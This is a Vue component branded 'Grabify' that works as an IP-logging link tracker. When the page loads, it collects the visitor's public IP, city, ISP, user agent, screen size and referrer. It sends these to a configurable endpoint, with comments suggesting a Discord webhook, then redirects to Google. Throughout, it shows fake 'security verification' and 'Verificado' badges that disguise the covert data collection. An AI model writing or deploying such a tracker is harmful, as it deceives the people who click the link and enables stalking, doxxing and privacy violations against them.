<script setup lang="ts">
import { onMounted, ref } from 'vue'
import { useRoute, useRouter } from 'vue-router'

// ============================================
// GRABIFY - Sistema de Registro de Visitas
// Componente para rastrear y redirigir usuarios
// ============================================

const route = useRoute()
const router = useRouter()

// Estado de carga para mostrar feedback al usuario
const isTracking = ref(true)
const statusMessage = ref('Verificando conexión segura...')
const hasError = ref(false)

// ============================================
// CONFIGURACIÓN - Personaliza estos valores
// ============================================

/**
 * URL de destino a la que se redirigirá al usuario
 * después de registrar la visita.
 * Ejemplo: 'https://ejemplo.com/pagina-destino'
 */
const REDIRECT_URL = 'https://www.google.com'

/**
 * Endpoint para enviar los datos de rastreo.
 * Puede ser tu backend o un webhook (Discord, Slack, etc.)
 * Ejemplo Discord webhook: 'https://discord.com/api/webhooks/...'
 */
const TRACKING_ENDPOINT = 'https://httpbin.org/post' // Cambia esto por tu endpoint real

/**
 * Servicio para obtener la IP pública.
 * Alternativas gratuitas:
 * - 'https://ipapi.co/json/'
 * - 'https://ipinfo.io/json'
 * - 'https://api.ipify.org?format=json'
 */
const IP_API_URL = 'https://ipapi.co/json/'

// ============================================
// INTERFACES
// ============================================

interface TrackingData {
  // Datos de red
  ip: string
  city?: string
  region?: string
  country?: string
  countryName?: string
  timezone?: string
  org?: string // ISP/Organización

  // Datos del dispositivo
  userAgent: string
  screenResolution: string
  language: string
  platform: string
  cookiesEnabled: boolean

  // Datos de la visita
  fullUrl: string
  path: string
  queryParams: Record<string, string | string[]>
  referrer: string
  timestamp: string
  visitId: string
}

// ============================================
// FUNCIONES AUXILIARES
// ============================================

/**
 * Genera un ID único para cada visita
 */
function generateVisitId(): string {
  return `${Date.now()}-${Math.random().toString(36).substring(2, 15)}`
}

/**
 * Obtiene la resolución de pantalla del dispositivo
 */
function getScreenResolution(): string {
  if (typeof window === 'undefined') return 'unknown'
  return `${window.screen.width}x${window.screen.height}`
}

/**
 * Obtiene los parámetros de consulta de la URL actual
 */
function getQueryParams(): Record<string, string | string[]> {
  const params: Record<string, string | string[]> = {}
  const searchParams = new URLSearchParams(window.location.search)

  searchParams.forEach((value, key) => {
    // Si el parámetro ya existe, convertir a array
    if (params[key]) {
      if (Array.isArray(params[key])) {
        (params[key] as string[]).push(value)
      } else {
        params[key] = [params[key] as string, value]
      }
    } else {
      params[key] = value
    }
  })

  return params
}

// ============================================
// FUNCIONES PRINCIPALES
// ============================================

/**
 * Obtiene la información de IP pública del visitante
 * usando ipapi.co (servicio gratuito)
 */
async function fetchIpData(): Promise<Partial<TrackingData>> {
  try {
    const response = await fetch(IP_API_URL, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
      },
    })

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`)
    }

    const data = await response.json()

    return {
      ip: data.ip,
      city: data.city,
      region: data.region,
      country: data.country,
      countryName: data.country_name,
      timezone: data.timezone,
      org: data.org || data.asn,
    }
  } catch (error) {
    console.warn('No se pudo obtener datos de IP:', error)
    // Retornar IP como fallback
    return { ip: 'unknown' }
  }
}

/**
 * Recopila todos los datos de rastreo del visitante
 */
async function collectTrackingData(): Promise<TrackingData> {
  // Obtener datos de IP en paralelo con otros datos
  const ipDataPromise = fetchIpData()

  // Recopilar datos del navegador
  const browserData = {
    userAgent: navigator.userAgent,
    screenResolution: getScreenResolution(),
    language: navigator.language || (navigator as unknown as { language: string }).language,
    platform: navigator.platform,
    cookiesEnabled: navigator.cookieEnabled,
  }

  // Recopilar datos de la visita
  const visitData = {
    fullUrl: window.location.href,
    path: route.fullPath,
    queryParams: getQueryParams(),
    referrer: document.referrer || 'direct',
    timestamp: new Date().toISOString(),
    visitId: generateVisitId(),
  }

  // Esperar datos de IP
  const ipData = await ipDataPromise

  return {
    ...ipData,
    ...browserData,
    ...visitData,
  } as TrackingData
}

/**
 * Envía los datos de rastreo al endpoint configurado
 */
async function sendTrackingData(data: TrackingData): Promise<void> {
  const response = await fetch(TRACKING_ENDPOINT, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
    },
    body: JSON.stringify(data),
  })

  if (!response.ok) {
    throw new Error(`Error enviando datos: ${response.status}`)
  }
}

/**
 * Redirige al usuario a la URL de destino
 * NOTA: Siempre redirige, incluso si falla el rastreo
 */
function redirectToDestination(): void {
  // Pequeño delay para que el usuario vea el mensaje final
  setTimeout(() => {
    window.location.href = REDIRECT_URL
  }, 800)
}

// ============================================
// CICLO DE VIDA
// ============================================

onMounted(async () => {
  try {
    // Fase 1: Recopilar datos
    statusMessage.value = 'Verificando conexión segura...'
    const trackingData = await collectTrackingData()

    // Fase 2: Enviar datos
    statusMessage.value = 'Estableciendo conexión...'
    await sendTrackingData(trackingData)

    // Fase 3: Preparar redirección
    statusMessage.value = 'Redirigiendo a destino seguro...'
    isTracking.value = false

    // Siempre redirigir al final
    redirectToDestination()

  } catch (error) {
    console.error('Error en el sistema de rastreo:', error)
    hasError.value = true
    statusMessage.value = 'Redirigiendo...'

    // IMPORTANTE: Incluso si hay error, redirigimos igual
    // para no dejar al usuario atascado
    redirectToDestination()
  }
})
</script>

<template>
  <div class="url-tracker">
    <div class="tracker-card">
      <!-- Icono animado -->
      <div class="icon-container">
        <div v-if="!hasError" class="pulse-ring"></div>
        <div class="icon-wrapper" :class="{ 'error': hasError }">
          <svg v-if="!hasError" class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
              d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
          </svg>
          <svg v-else class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
              d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
        </div>
      </div>

      <!-- Mensaje de estado -->
      <h1 class="title">
        {{ hasError ? 'Conexión verificada' : 'Verificación de seguridad' }}
      </h1>

      <p class="status-text">
        {{ statusMessage }}
      </p>

      <!-- Barra de progreso animada -->
      <div class="progress-container">
        <div class="progress-bar" :class="{ 'error': hasError }"></div>
      </div>

      <!-- URL de destino (para transparencia) -->
      <p class="destination-hint">
        Serás redirigido a:<br>
        <span class="destination-url">{{ REDIRECT_URL }}</span>
      </p>

      <!-- Info de seguridad -->
      <div class="security-badges">
        <span class="badge">
          <svg class="badge-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
              d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
          </svg>
          Conexión segura
        </span>
        <span class="badge">
          <svg class="badge-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
              d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          Verificado
        </span>
      </div>
    </div>

    <!-- Footer -->
    <p class="footer-text">
      Grabify Tracker System © {{ new Date().getFullYear() }}
    </p>
  </div>
</template>

<style scoped>
/* ============================================
   ESTILOS - Diseño limpio y profesional
   ============================================ */

.url-tracker {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  padding: 20px;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
}

.tracker-card {
  background: white;
  border-radius: 20px;
  padding: 48px 40px;
  max-width: 420px;
  width: 100%;
  text-align: center;
  box-shadow:
    0 20px 60px rgba(0, 0, 0, 0.3),
    0 0 0 1px rgba(255, 255, 255, 0.1);
  animation: slideUp 0.5s ease-out;
}

@keyframes slideUp {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

/* Icono con animación de pulso */
.icon-container {
  position: relative;
  display: inline-flex;
  margin-bottom: 24px;
}

.pulse-ring {
  position: absolute;
  inset: -8px;
  border-radius: 50%;
  background: rgba(102, 126, 234, 0.2);
  animation: pulse 2s ease-in-out infinite;
}

@keyframes pulse {
  0%, 100% {
    transform: scale(1);
    opacity: 1;
  }
  50% {
    transform: scale(1.1);
    opacity: 0.5;
  }
}

.icon-wrapper {
  position: relative;
  width: 80px;
  height: 80px;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
}

.icon-wrapper.error {
  background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
  box-shadow: 0 8px 20px rgba(245, 87, 108, 0.4);
}

.shield-icon {
  width: 40px;
  height: 40px;
  color: white;
}

/* Títulos y texto */
.title {
  font-size: 24px;
  font-weight: 700;
  color: #1a202c;
  margin: 0 0 8px 0;
}

.status-text {
  font-size: 15px;
  color: #718096;
  margin: 0 0 24px 0;
  min-height: 22px;
}

/* Barra de progreso */
.progress-container {
  width: 100%;
  height: 4px;
  background: #edf2f7;
  border-radius: 2px;
  overflow: hidden;
  margin-bottom: 24px;
}

.progress-bar {
  height: 100%;
  width: 100%;
  background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
  border-radius: 2px;
  animation: progress 2s ease-in-out infinite;
  transform-origin: left;
}

.progress-bar.error {
  background: linear-gradient(90deg, #f093fb 0%, #f5576c 100%);
  animation: none;
  width: 100%;
}

@keyframes progress {
  0% {
    transform: scaleX(0);
  }
  50% {
    transform: scaleX(0.7);
  }
  100% {
    transform: scaleX(1);
  }
}

/* Info de destino */
.destination-hint {
  font-size: 13px;
  color: #a0aec0;
  margin: 0 0 20px 0;
  line-height: 1.5;
}

.destination-url {
  color: #667eea;
  font-weight: 600;
  word-break: break-all;
}

/* Badges de seguridad */
.security-badges {
  display: flex;
  justify-content: center;
  gap: 12px;
  flex-wrap: wrap;
}

.badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 6px 12px;
  background: #f7fafc;
  border-radius: 20px;
  font-size: 12px;
  font-weight: 500;
  color: #4a5568;
  border: 1px solid #e2e8f0;
}

.badge-icon {
  width: 14px;
  height: 14px;
  color: #48bb78;
}

/* Footer */
.footer-text {
  margin-top: 24px;
  font-size: 12px;
  color: rgba(255, 255, 255, 0.6);
}

/* Responsive */
@media (max-width: 480px) {
  .tracker-card {
    padding: 36px 24px;
  }

  .title {
    font-size: 20px;
  }

  .icon-wrapper {
    width: 64px;
    height: 64px;
  }

  .shield-icon {
    width: 32px;
    height: 32px;
  }
}
</style>
